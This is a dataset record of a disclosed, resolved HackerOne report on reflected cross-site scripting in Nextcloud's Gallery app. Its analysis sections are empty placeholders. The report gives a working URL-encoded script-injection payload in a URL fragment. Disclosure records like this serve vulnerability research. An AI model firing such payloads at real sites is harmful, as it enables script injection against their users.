---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '165686'
original_report_id: '165686'
title: Reflected XSS in Gallery App
weakness: Cross-site Scripting (XSS) - Generic
team_handle: nextcloud
created_at: '2016-09-04T15:59:09.562Z'
disclosed_at: '2016-12-03T22:01:12.670Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 7
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# Reflected XSS in Gallery App

## Metadata

- HackerOne Report ID: 165686
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: nextcloud
- Disclosed At: 2016-12-03T22:01:12.670Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Go to: `nextcloud/index.php/apps/gallery/#%3E%3Cscript%3Ealert%28document.domain%29%3C/script%3Ejavascript:alert%280%29//%00`

Tested on: Firefox 43.0.1

If you need more information then write me.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
